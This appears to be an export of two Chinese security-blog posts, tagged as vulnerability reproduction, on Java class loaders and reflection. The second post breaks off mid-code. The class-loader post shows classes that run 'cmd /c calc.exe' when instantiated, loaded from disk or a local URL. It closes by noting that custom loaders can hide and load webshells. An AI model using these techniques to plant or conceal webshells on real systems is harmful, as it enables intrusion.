[{"title":"JavaWeb_类加载器","url":"http://yoursite.com/2021/08/25/类加载器/","content":"<h2 id=\"类加载机制\"><a href=\"#类加载机制\" class=\"headerlink\" title=\"类加载机制\"></a>类加载机制</h2><p> <code>.java</code>文件在运行前先通过javac编译成<code>.class</code>文件。之后<code>.class</code>会在java虚拟机中运行。但是在java虚拟机中的运行会经过一系列的类的加载、连接和初始化操作，最后在java虚拟机内存使用自身方法区中字节码<strong>二进制数据</strong>去引用堆区的Class对象。</p>\n<h2 id=\"双亲委派机制\"><a href=\"#双亲委派机制\" class=\"headerlink\" title=\"双亲委派机制\"></a>双亲委派机制</h2><p>当一个加载器查找class和resource时，会再用委派的机制，即加载器会判断这个class是否被加载，如果没有被加载，它本身是不会进行查找这个class，而是将其返回给父加载器，由父加载器来进行查找。这个过程会一直递归下去，直到<code>BootstrapClassLoader</code>。如果<code>BootstrapClassLoader</code>找到了，直接返回，如果没有再递归下去，最后由自身来查找对象。</p>\n<p>在默认情况下如果没有指定类加载器的情况下，通常会使用<code>AppClassLoader</code>来加载类</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210822193546774.png\" alt=\"image-20210822193546774\"></p>\n<p>双亲委派可以避免类的重复加载，直接委派给父类进行加载。同时也是保证Java核心库的类型安全。</p>\n<blockquote>\n<p> 如果通过网络传输一个类，通过双亲委派的模式传递到启动类钟，发现该类已经被加载过，就不会再加载从网络传输过来的类。这样避免了Java库核心API被篡改</p>\n</blockquote>\n<h2 id=\"类加载器分类\"><a href=\"#类加载器分类\" class=\"headerlink\" title=\"类加载器分类\"></a>类加载器分类</h2><p>类加载器分为两大类，一类是JVM自带的类加载器，另一类是用户自定义的加载器</p>\n<h3 id=\"JVM默认加载器\"><a href=\"#JVM默认加载器\" class=\"headerlink\" title=\"JVM默认加载器\"></a>JVM默认加载器</h3><h4 id=\"BootstrapClassLoader（引导类加载器）\"><a href=\"#BootstrapClassLoader（引导类加载器）\" class=\"headerlink\" title=\"BootstrapClassLoader（引导类加载器）\"></a>BootstrapClassLoader（引导类加载器）</h4><p>由<code>C++</code>编写，属于jvm一部分，主要负责加载核心Java库，存储在<code>/jre/lib/rt.jar</code>中</p>\n<h4 id=\"ExtensionsClassLoader（扩展类加载器）\"><a href=\"#ExtensionsClassLoader（扩展类加载器）\" class=\"headerlink\" title=\"ExtensionsClassLoader（扩展类加载器）\"></a>ExtensionsClassLoader（扩展类加载器）</h4><p>由<code>sun.misc.Launcher$ExtClassLoader</code>类实现，用来在<code>/jre/lib/ext</code>或者<code>java.ext.dirs</code>中指明的目录加载java的扩展库</p>\n<h4 id=\"AppClassLoader（App类加载器）\"><a href=\"#AppClassLoader（App类加载器）\" class=\"headerlink\" title=\"AppClassLoader（App类加载器）\"></a>AppClassLoader（App类加载器）</h4><p>由<code>sun.misc.Launcher$AppClassLoader</code>实现。通常我们是使用这个加载类来加载Java应用类</p>\n<h3 id=\"UserDefineClassLoader（自定义类加载器）\"><a href=\"#UserDefineClassLoader（自定义类加载器）\" class=\"headerlink\" title=\"UserDefineClassLoader（自定义类加载器）\"></a>UserDefineClassLoader（自定义类加载器）</h3><p>用户自定义的类加载器，可以加载指定路径的文件</p>\n<h2 id=\"ClassLoader类核心方法\"><a href=\"#ClassLoader类核心方法\" class=\"headerlink\" title=\"ClassLoader类核心方法\"></a>ClassLoader类核心方法</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> Class&lt;?&gt; loadClass(String name, <span class=\"keyword\">boolean</span> resolve)</span><br><span class=\"line\">        <span class=\"keyword\">throws</span> ClassNotFoundException</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// First, check if the class has already been loaded</span></span><br><span class=\"line\">            Class c = findLoadedClass(name);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (c == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">long</span> t0 = System.nanoTime();</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (parent != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                        c = parent.loadClass(name, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        c = findBootstrapClassOrNull(name);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (ClassNotFoundException e) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// ClassNotFoundException thrown if class not found</span></span><br><span class=\"line\">                    <span class=\"comment\">// from the non-null parent class loader</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (c == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// If still not found, then invoke findClass in order</span></span><br><span class=\"line\">                    <span class=\"comment\">// to find the class.</span></span><br><span class=\"line\">                    <span class=\"keyword\">long</span> t1 = System.nanoTime();</span><br><span class=\"line\">                    c = findClass(name);</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\">// this is the defining class loader; record the stats</span></span><br><span class=\"line\">                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class=\"line\">                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class=\"line\">                    sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (resolve) &#123;</span><br><span class=\"line\">                resolveClass(c);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> c;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>LoadClass：加载指定的java类<br>findClass：查找指定的Java类<br>findLoadedClass：查找JVM已经加载过的类<br>defineClass：定义一个Java类，将字节码解析成Java虚拟机能识别的对象<br>resolveClass：链接指定的Java类</p>\n</blockquote>\n<p>在<code>loadClass</code>中，先调用<code>findLoadedClass</code>方法来判断这个类是否已经被加载过了。如果没有被加载过进入循环使用父加载器来调用<code>loadClass</code>方法，开始递归的过程，不断向上。如果父加载器返回Null，说明递归的过程已经结束，已经开始向下使用JVM内置的加载器。之后再调用<code>findClass</code>方法来查找类，最后通过resolveClass来处理类</p>\n<h2 id=\"自定义加载器过程\"><a href=\"#自定义加载器过程\" class=\"headerlink\" title=\"自定义加载器过程\"></a>自定义加载器过程</h2><p>当我们需要动态加载一些东西，这个时候往往需要自定义加载器。自定义加载器步骤如下：</p>\n<blockquote>\n<ol>\n<li>编写一个类，这个类需要继承ClassLoader</li>\n<li>重写findClass()</li>\n<li>在findClass()方法中调用defineClass()方法</li>\n</ol>\n</blockquote>\n<p>先编写一个<code>Test</code>类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.test;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">method</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"This is a test\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后使用javac来进行编译</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210822204531260.png\" alt=\"image-20210822204531260\"></p>\n<p>将<code>.class</code>文件转换为byte类型</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.test;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> sun.misc.IOUtils;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileNotFoundException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.InputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Arrays;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ulits</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">        InputStream fis = <span class=\"keyword\">new</span> FileInputStream(<span class=\"string\">\"F:\\\\JAVA\\\\Project\\\\Java_test\\\\src\\\\com\\\\test\\\\Test.class\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] bytes = IOUtils.readFully(fis, -<span class=\"number\">1</span>, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">        System.out.println(Arrays.toString(bytes));</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210823213221927.png\" alt=\"image-20210823213221927\"></p>\n<p>然后自定义加载器类，将转换后的字节码填入并编译运行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.test;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\">public class classloader extends ClassLoader&#123;</span><br><span class=\"line\">    private static String testclassname= &quot;com.test.Test&quot;;</span><br><span class=\"line\">    //转换byte后的字节码</span><br><span class=\"line\">    private static byte[] classbytes= new byte[]&#123;-54, -2, -70, -66, 0, 0, 0, 52, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0, 16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 6, 109, 101, 116, 104, 111, 100, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 9, 84, 101, 115, 116, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 14, 84, 104, 105, 115, 32, 105, 115, 32, 97, 32, 116, 101, 115, 116, 1, 0, 13, 99, 111, 109, 47, 116, 101, 115, 116, 47, 84, 101, 115, 116, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1, 0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 3, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1, 0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 5, 0, 1, 0, 11, 0, 0, 0, 2, 0, 12&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;</span><br><span class=\"line\">        //只处理com.test.test类</span><br><span class=\"line\">        if (name.equals(testclassname)) &#123;</span><br><span class=\"line\">            //将一个字节流定义为一个类。</span><br><span class=\"line\">            return defineClass(testclassname, classbytes, 0, classbytes.length);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return super.findClass(name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) throws Exception &#123;</span><br><span class=\"line\">        //创建加载器</span><br><span class=\"line\">        classloader classloadertest = new classloader();</span><br><span class=\"line\">        //使用我们自定义的类去加载testclassname</span><br><span class=\"line\">        Class aClass = classloadertest.loadClass(testclassname);</span><br><span class=\"line\">        //反射创建test类对象</span><br><span class=\"line\">        Object o = aClass.newInstance();</span><br><span class=\"line\">        //反射获取method方法</span><br><span class=\"line\">        Method method = o.getClass().getMethod(&quot;method&quot;);</span><br><span class=\"line\">        //反射去调用执行method方法</span><br><span class=\"line\">        String str = (String) method.invoke(o);</span><br><span class=\"line\">        System.out.println(str);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210823213337430.png\" alt=\"image-20210823213337430\"></p>\n<h2 id=\"URLClassLoader\"><a href=\"#URLClassLoader\" class=\"headerlink\" title=\"URLClassLoader\"></a>URLClassLoader</h2><p><code>URLClassLoader</code>继承了<code>ClassLoader</code>类，可以加载本地文件或者远程加载<code>jar</code>包</p>\n<h3 id=\"本地加载\"><a href=\"#本地加载\" class=\"headerlink\" title=\"本地加载\"></a>本地加载</h3><p>测试代码：</p>\n<p>test.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.urlclassloader;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">test</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Test\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            Runtime.getRuntime().exec(<span class=\"string\">\"cmd /c calc.exe\"</span>);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过<code>javac</code>编译为<code>.class</code>文件</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210823214549791.png\" alt=\"image-20210823214549791\"></p>\n<p>在编写<code>ClassLoader.java</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.Classloader;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.File;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URI;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URL;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URLClassLoader;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ClassloaderTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        File file = <span class=\"keyword\">new</span> File(<span class=\"string\">\"F:\\\\JAVA\\\\Project\\\\Java_test\\\\src\"</span>);</span><br><span class=\"line\">        URI uri = file.toURI();</span><br><span class=\"line\">        URL url = uri.toURL();<span class=\"comment\">//使用File类获取文件路径</span></span><br><span class=\"line\"></span><br><span class=\"line\">        URLClassLoader classLoader = <span class=\"keyword\">new</span> URLClassLoader(<span class=\"keyword\">new</span> URL[]&#123;url&#125;);<span class=\"comment\">//获取url地址</span></span><br><span class=\"line\">        Class clazz = classLoader.loadClass(<span class=\"string\">\"com.urlclassloader.test\"</span>);<span class=\"comment\">//获取test.class所含包名</span></span><br><span class=\"line\">        clazz.newInstance();<span class=\"comment\">//实例化对象</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210823215120962.png\" alt=\"image-20210823215120962\"></p>\n<h3 id=\"远程加载\"><a href=\"#远程加载\" class=\"headerlink\" title=\"远程加载\"></a>远程加载</h3><p>test.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.urlclassloader;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">test</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Test\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            Runtime.getRuntime().exec(<span class=\"string\">\"cmd /c calc.exe\"</span>);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过javac编译</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210824211758784.png\" alt=\"image-20210824211758784\"></p>\n<p>然后放到tomcat目录下</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210824211833937.png\" alt=\"image-20210824211833937\"></p>\n<p>urlclassLoader.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.urlclassloader;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URL;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URLClassLoader;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">urlclassLoader</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span> <span class=\"params\">(String[]args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        URL url = <span class=\"keyword\">new</span> URL(<span class=\"string\">\"http://127.0.0.1:8080/\"</span>);</span><br><span class=\"line\">        URLClassLoader classLoader = <span class=\"keyword\">new</span> URLClassLoader(<span class=\"keyword\">new</span> URL[]&#123;url&#125;);</span><br><span class=\"line\">        Class clazz = classLoader.loadClass(<span class=\"string\">\"com.urlclassloader.test\"</span>);</span><br><span class=\"line\">        clazz.newInstance();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210824211952465.png\" alt=\"image-20210824211952465\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>在实际环境中，我们可以通过自定加载器和恶意的类来加载我们的webshell，同时这也是对webshell加密的一种方式。</p>\n","categories":["漏洞复现"],"tags":["代码审计","Java"]},{"title":"JavaWEB_反射","url":"http://yoursite.com/2021/08/17/反射/","content":"<h2 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h2><p>反射的核心是在JVM运行状态的时候动态加载类，并且对于<strong>任意一个类</strong>都能够获取到这个类所有的属性和方法；并且对于任意一个对象都能够调用它的方法、访问属性。这种动态获取信息以及动态调用对象方法的功能称为Java的反射机制。通过使用反射可以获取到任何类的成员方法（Methods）、成员变量（Fields）、构造方法（Constructors）等信息，另外还能动态创建Java类实例、调用任意类方法、修改任意类成员变量值等。</p>\n<blockquote>\n<p>动态特性：改变一段代码中的一些变量，将会导致这段代码产生功能性的变化             </p>\n</blockquote>\n<h2 id=\"反射机制流程图\"><a href=\"#反射机制流程图\" class=\"headerlink\" title=\"反射机制流程图\"></a>反射机制流程图</h2><p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20210309194221.png\" alt=\"20210309194221\"></p>\n<p>当我们创建了一个java文件，通过<code>javac</code>编译后会生成class文件，这个class文件会通过jvm进行查找，并读入内存中通过ClassLoader加载，然后会自动创建一个class对象，这个class对象拥有能获取成员变量Field，成员方法Method，构造方法Constructor等方法，最后就是通过<code>new</code>来创建一个新对象</p>\n<p>反射的实质就是创建一个Class对象，然后通过Class对象中的<code>Field</code>、<code>Method</code>、<code>Constructor</code>等方法，再去动态的调用任意类或任意类的属性，变量，方法等。</p>\n<h2 id=\"Class对象的获取\"><a href=\"#Class对象的获取\" class=\"headerlink\" title=\"Class对象的获取\"></a>Class对象的获取</h2><p>java反射机制的基础就是获取对象的class类，通常情况下想获取一个类或调用一个类的方法，都是先获取该类的Class对象。</p>\n<p>关于普通的对象，可以采取最常用的的<code>New</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Test test = <span class=\"keyword\">new</span> Test();</span><br></pre></td></tr></table></figure>\n\n<p>而Class类具有private私有属性，所以我们无法通过New来创建Class对象。</p>\n<h3 id=\"获取方式一：类的class属性\"><a href=\"#获取方式一：类的class属性\" class=\"headerlink\" title=\"获取方式一：类的class属性\"></a>获取方式一：类的class属性</h3><p>直接通过类名的属性class获取：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class c1 = Demo.class</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"获取方式二：实例化对象的getClass-方法（不属于反射）\"><a href=\"#获取方式二：实例化对象的getClass-方法（不属于反射）\" class=\"headerlink\" title=\"获取方式二：实例化对象的getClass()方法（不属于反射）\"></a>获取方式二：实例化对象的<code>getClass()</code>方法（不属于反射）</h3><p>先通过实例化一个对象，在通过<code>getClass()</code>获取Class对象</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Test demo = <span class=\"keyword\">new</span> Test();</span><br><span class=\"line\">Class c2 = demo.getClass();</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"获取方式三：Class-forName-String-className-：动态加载类\"><a href=\"#获取方式三：Class-forName-String-className-：动态加载类\" class=\"headerlink\" title=\"获取方式三：Class.forName(String className)：动态加载类\"></a>获取方式三：Class.forName(String className)：动态加载类</h3><p>通过调用<code>forName()</code>，将字节码文件加载进内存，从而返回class对象</p>\n<p>针对三种获取方式的测试代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.reflect;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ReflectDemo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> ClassNotFoundException</span>&#123;</span><br><span class=\"line\">        Class c1 = ReflectDemo.class;</span><br><span class=\"line\">        System.out.println(c1.getName());</span><br><span class=\"line\"></span><br><span class=\"line\">        ReflectDemo test = <span class=\"keyword\">new</span> ReflectDemo();</span><br><span class=\"line\">        Class c2 = test.getClass();</span><br><span class=\"line\">        System.out.println(c2.getName());</span><br><span class=\"line\"></span><br><span class=\"line\">        Class c3 = Class.forName(<span class=\"string\">\"com.reflect.ReflectDemo\"</span>);</span><br><span class=\"line\">        System.out.println(c3.getName());</span><br><span class=\"line\">    &#125;</span><br><span 